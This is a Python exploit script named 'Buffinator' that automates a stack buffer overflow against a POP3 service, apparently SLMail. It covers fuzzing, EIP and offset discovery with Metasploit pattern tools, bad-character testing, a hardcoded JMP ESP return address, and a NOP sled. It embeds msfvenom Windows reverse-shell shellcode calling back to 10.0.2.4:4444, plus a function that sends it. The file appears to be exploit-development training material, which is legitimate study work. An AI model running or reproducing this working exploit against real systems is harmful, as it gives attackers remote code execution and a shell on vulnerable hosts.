#!/usr/bin/python

banner = """
    ____        _________             __            
   / __ )__  __/ __/ __(_)___  ____ _/ /_____  _____
  / __  / / / / /_/ /_/ / __ \/ __ `/ __/ __ \/ ___/
 / /_/ / /_/ / __/ __/ / / / / /_/ / /_/ /_/ / /    
/_____/\__,_/_/ /_/ /_/_/ /_/\__,_/\__/\____/_/   

	Author :Steve Mcilwain
	GitHub : https://github.com/stevemcilwain

"""

import sys
import socket
import os
from time import sleep

if len(sys.argv) != 2:
    print(banner)
    print("[!] Usage: {0} <target_ip> \n\n")
    sys.exit(1)

TARGET = sys.argv[1].strip()

def main():

    print(banner)
    print("[*] targeting {0}".format(TARGET))

    # PAYLOAD   
    # ------------------------------------------------------------------
    # | Buffer                      Offset > | EIP  | Nops | Shellcode |
    # ------------------------------------------------------------------ 
    # 
    # 1. Fuzz to determine size of the Buffer 
    #
    # Uncomment this line to run "fuzz" with the first argument as the 
    # increment size and the second argument as the maximum size to try.
    #
    fuzz(100,10000)
    #
    RESULT_FUZZ_BUFFER_SIZE = 2800
    #
    # 2. Locate EIP using a pattern_create.rb to determine the address of
    # of the EIP
    #
    #locate_eip(RESULT_FUZZ_BUFFER_SIZE)
    #
    RESULT_LOCATE_EIP = "39694438"
    #
    # 3. Locate Offset using pattern_offset to determine the exact size of the
    #  buffer for the payload and control what goes into the EIP.
    #
    #locate_offset(RESULT_FUZZ_BUFFER_SIZE, RESULT_LOCATE_EIP)
    #
    RESULT_LOCATE_OFFSET = 2606
    #
    # 4. Write 4 bytes to the EIP to verify control using "42424242"
    #
    #write_eip(RESULT_LOCATE_OFFSET)
    #
    # 5. Find bad chars
    #
    #
    BAD_CHARS = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
    "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
    #
    #find_bad_chars(RESULT_LOCATE_OFFSET, BAD_CHARS)
    #
    RESULT_BAD_CHARS = "\x00\x0a\x0d"
    #
    # 6. Find the right module.  Go to !mona modules and look for "false"
    # no SEH, ASLR or NX.  
    #
    #  !mona modules
    # 
    # Message= 0x5f400000 | 0x5f4f4000 | 0x000f4000 | False  | False   | False |  False   | True   | 6.00.8063.0 [SLMFC.DLL] (C:\Windows\SYSTEM32\SLMFC.DLL)
    #
    # Identify the OPCODE, like JMP ESP (FFE4)
    # 
    # !mona find -s \xff\xe4 -m <module>
    #
    # Message=  0x5f4a358f : "\xff\xe4" |  {PAGE_READONLY} [SLMFC.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v6.00.8063.0 (C:\Windows\SYSTEM32\SLMFC.DLL)
    #
    # Use the blue bar to find the address and set a breakpoint
    #
    RETURN_ADDRESS = "\x5F\x4A\x35\x8F"
    RETURN_ADDRESS_REVERSED = "\x8F\x35\x4A\x5F"
    #
    # 7. Generate shell code
    #
    # msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.4 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00\x0a\x0d" -v SHELLCODE
    SHELLCODE =  ""
    SHELLCODE += "\xbe\x36\xbb\xd2\x89\xd9\xe1\xd9\x74\x24\xf4\x5a"
    SHELLCODE += "\x33\xc9\xb1\x52\x83\xc2\x04\x31\x72\x0e\x03\x44"
    SHELLCODE += "\xb5\x30\x7c\x54\x21\x36\x7f\xa4\xb2\x57\x09\x41"
    SHELLCODE += "\x83\x57\x6d\x02\xb4\x67\xe5\x46\x39\x03\xab\x72"
    SHELLCODE += "\xca\x61\x64\x75\x7b\xcf\x52\xb8\x7c\x7c\xa6\xdb"
    SHELLCODE += "\xfe\x7f\xfb\x3b\x3e\xb0\x0e\x3a\x07\xad\xe3\x6e"
    SHELLCODE += "\xd0\xb9\x56\x9e\x55\xf7\x6a\x15\x25\x19\xeb\xca"
    SHELLCODE += "\xfe\x18\xda\x5d\x74\x43\xfc\x5c\x59\xff\xb5\x46"
    SHELLCODE += "\xbe\x3a\x0f\xfd\x74\xb0\x8e\xd7\x44\x39\x3c\x16"
    SHELLCODE += "\x69\xc8\x3c\x5f\x4e\x33\x4b\xa9\xac\xce\x4c\x6e"
    SHELLCODE += "\xce\x14\xd8\x74\x68\xde\x7a\x50\x88\x33\x1c\x13"
    SHELLCODE += "\x86\xf8\x6a\x7b\x8b\xff\xbf\xf0\xb7\x74\x3e\xd6"
    SHELLCODE += "\x31\xce\x65\xf2\x1a\x94\x04\xa3\xc6\x7b\x38\xb3"
    SHELLCODE += "\xa8\x24\x9c\xb8\x45\x30\xad\xe3\x01\xf5\x9c\x1b"
    SHELLCODE += "\xd2\x91\x97\x68\xe0\x3e\x0c\xe6\x48\xb6\x8a\xf1"
    SHELLCODE += "\xaf\xed\x6b\x6d\x4e\x0e\x8c\xa4\x95\x5a\xdc\xde"
    SHELLCODE += "\x3c\xe3\xb7\x1e\xc0\x36\x17\x4e\x6e\xe9\xd8\x3e"
    SHELLCODE += "\xce\x59\xb1\x54\xc1\x86\xa1\x57\x0b\xaf\x48\xa2"
    SHELLCODE += "\xdc\xda\x8c\xae\x18\xb3\x8e\xae\x31\x1f\x06\x48"
    SHELLCODE += "\x5b\x8f\x4e\xc3\xf4\x36\xcb\x9f\x65\xb6\xc1\xda"
    SHELLCODE += "\xa6\x3c\xe6\x1b\x68\xb5\x83\x0f\x1d\x35\xde\x6d"
    SHELLCODE += "\x88\x4a\xf4\x19\x56\xd8\x93\xd9\x11\xc1\x0b\x8e"
    SHELLCODE += "\x76\x37\x42\x5a\x6b\x6e\xfc\x78\x76\xf6\xc7\x38"
    SHELLCODE += "\xad\xcb\xc6\xc1\x20\x77\xed\xd1\xfc\x78\xa9\x85"
    SHELLCODE += "\x50\x2f\x67\x73\x17\x99\xc9\x2d\xc1\x76\x80\xb9"
    SHELLCODE += "\x94\xb4\x13\xbf\x98\x90\xe5\x5f\x28\x4d\xb0\x60"
    SHELLCODE += "\x85\x19\x34\x19\xfb\xb9\xbb\xf0\xbf\xda\x59\xd0"
    SHELLCODE += "\xb5\x72\xc4\xb1\x77\x1f\xf7\x6c\xbb\x26\x74\x84"
    SHELLCODE += "\x44\xdd\x64\xed\x41\x99\x22\x1e\x38\xb2\xc6\x20"
    SHELLCODE += "\xef\xb3\xc2"
    #
    #send_shellcode(RESULT_LOCATE_OFFSET,RETURN_ADDRESS_REVERSED,32,SHELLCODE)


    print("\n[*] Buffinator has completed.\n\n")
    sys.exit(0)

# Choose the protocol to attack

def send_with(payload):
    protocol_POP3(payload)

################################################################################
# Protocols 
################################################################################

def protocol_POP3(payload):

    PORT = 110

    print(" [-] connecting to {0}:{1}...".format(TARGET,PORT))

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((TARGET,PORT))

    print(" [-] connected, sending payload of {} bytes...".format(str(len(payload))))

    s.send("USER " + "username" +  "\r\n")
    s.recv(1024)
    s.send("PASS " + payload + "\r\n")
    s.recv(1024)
    s.send("QUIT\r\n")
    s.close()
    
    print(" [-] connection closed.")

def protocol_HTTP(payload):

    PORT = 80

    print(" [-] connecting to {0}:{1}...".format(TARGET,PORT))

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((TARGET,PORT))

    print(" [-] connected, sending payload of {} bytes...".format(str(len(payload))))

    s.send("GET " + "/" + payload + "\r\n")
    s.recv(1024)
    s.close()
    
    print(" [-] connection closed.")

################################################################################
# Functions 
################################################################################

def fuzz(increment, max):

    print("[*] fuzzing started...")
    buffer = "A" * 100
        
    while len(buffer) < max:
        send_with(buffer)
        buffer = buffer + ("A" * increment)

    print("[*] fuzzing completed.")

def locate_eip(pattern_size):
    print("[*] generating pattern of size {}".format(str(pattern_size)))
    cmd = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {0}".format(pattern_size)
    result = os.popen(cmd).read()
    payload = result
    send_with(payload)
    print("[*] pattern payload delivered, check the EIP register for the offset value.")

def locate_offset(buffer_size, eip_contents):
    print("[*] getting offset of {}".format(eip_contents))
    cmd = "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l {0} -q {1} | grep Exact | cut -d' ' -f6".format(buffer_size, eip_contents)
    offset = os.popen(cmd).read()
    print("[*] {}".format(offset))

def write_eip(buffer_size):
    buffer = "A" * buffer_size
    eip = "BBBB"
    payload = buffer + eip
    send_with(payload)
    print("[*] EIP payload delivered, verify that the EIP register contains 42424242.")

def find_bad_chars(buffer_size, bad_chars):
    buffer = "A" * buffer_size
    eip = "BBBB"
    payload = buffer + eip + bad_chars
    send_with(payload)
    print("[*] Badchars payload delivered, check the hex dump of ESP and compare.")

def send_shellcode(buffer_size, return_address, nop_size, shell_code):
    print("[*] Sending reverse shell code - ensure you have a handler...")
    buffer = "A" * buffer_size
    nop_sled = "\x90" * nop_size
    payload = buffer + return_address + nop_sled + shell_code
    send_with(payload)
    print("[*] Shellcode payload delivered, check your handler.")

################################################################################
# Entry Point
################################################################################

if __name__ == '__main__':
    main()
